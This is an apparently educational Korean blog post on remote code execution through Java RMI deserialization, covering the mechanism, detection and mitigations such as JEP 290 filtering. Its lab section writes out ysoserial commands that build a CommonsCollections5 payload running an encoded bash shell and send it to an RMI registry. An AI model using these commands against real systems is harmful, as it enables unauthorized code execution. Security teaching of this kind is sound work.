---
layout: post
title: "Java RMI"
date: 2025-09-22
categories: [app-hacking]
tags: [Java RMI, Deserialization, RCE, App Hacking]
description: "Java RMI 서비스의 오설정으로 인한 원격 코드 실행 취약점과 역직렬화 공격 원리 분석"
---

## 1. 개요

**Java RMI (Remote Method Invocation)**는 자바 프로그램이 네트워크 상의 다른 자바 가상 머신(JVM)에 있는 객체의 메소드를 호출하여 로컬 객체처럼 사용할 수 있게 해주는 기술이다.
편리한 분산 컴퓨팅 환경을 제공하지만, 잘못 설정된 RMI 서비스는 공격자에게 **원격 코드 실행(RCE)**의 기회를 제공하는 치명적인 취약점이 될 수 있다.

### 기본 정보
*   **기본 포트**: 1099/tcp (RMI Registry)
*   **통신 방식**: 객체 직렬화(Serialization)를 통한 데이터 전송
*   **주요 위협**: 신뢰하지 않는 데이터의 역직렬화(Deserialization)로 인한 악성 코드 실행

---

## 2. 취약점 분석

Java RMI 취약점은 주로 불필요하게 외부로 노출된 RMI 레지스트리와 안전하지 않은 역직렬화 과정에서 발생한다.

### 2.1. RMI 레지스트리 열거
공격자는 먼저 Nmap 등을 이용해 대상 서버에서 RMI 서비스가 실행 중인지 확인하고, 어떤 객체가 등록되어 있는지 정보를 수집한다.

```bash
# Nmap으로 RMI 서비스 탐지 및 정보 덤프
nmap -sV --script rmi-dumpregistry -p 1099 <target>
```

### 2.2. 역직렬화(Deserialization)
Java는 객체를 바이트 스트림으로 변환(직렬화)하여 전송하고, 받는 쪽에서 다시 객체로 복원(역직렬화)한다. 공격자는 이 과정에 악성 코드가 포함된 조작된 객체를 주입한다. 만약 서버에 취약한 라이브러리(예: Commons Collections)가 존재하면, 객체가 복원되는 순간 악성 코드가 실행된다.

---

## 3. 실습: 취약점 분석

`ysoserial` 도구를 사용하여 악성 페이로드를 생성하고 RMI 서비스에 전송하여 원격 코드를 실행하는 과정이다.

### 공격 도구 활용 (ysoserial)
```bash
# 1. 악성 페이로드 생성 (Base64 인코딩된 쉘 실행)
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" > payload.ser

# 2. RMI 서비스로 익스플로잇 전송
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <target> 1099 CommonsCollections5 "whoami"
```

아래는 `nmap` 스크립트를 사용하여 취약한 Java RMI 서비스를 진단하는 모습이다.

![Java RMI Enumeration](/assets/images/att-ck/3.1.5.1.java.png)

---

## 4. 탐지 및 보안 대책

### 탐지 방법
*   **포트 스캔**: 외부에서 접근 가능한 1099 포트 확인.
*   **네트워크 로그**: RMI 프로토콜 특유의 직렬화 헤더(`AC ED 00 05`) 트래픽 모니터링.
*   **로그 분석**: JVM 로그에서 `ClassNotFoundException` 등 역직렬화 관련 예외 발생 여부 확인.

### 보안 대책
1.  **네트워크 격리**: RMI 포트(1099 및 동적 포트)에 대한 방화벽 접근 통제 (외부 접근 차단).
2.  **SSL/TLS 적용**: RMI 통신 시 SSL/TLS를 적용하고 클라이언트 인증(Mutual Auth)을 수행한다.
3.  **라이브러리 패치**: `Apache Commons Collections` 등 알려진 취약점이 있는 라이브러리를 최신 버전으로 업데이트하거나 제거한다.
4.  **직렬화 필터링**: JDK 9+부터 도입된 **JEP 290** 직렬화 필터를 적용하여 화이트리스트에 없는 클래스의 역직렬화를 차단한다.

<hr class="short-rule">
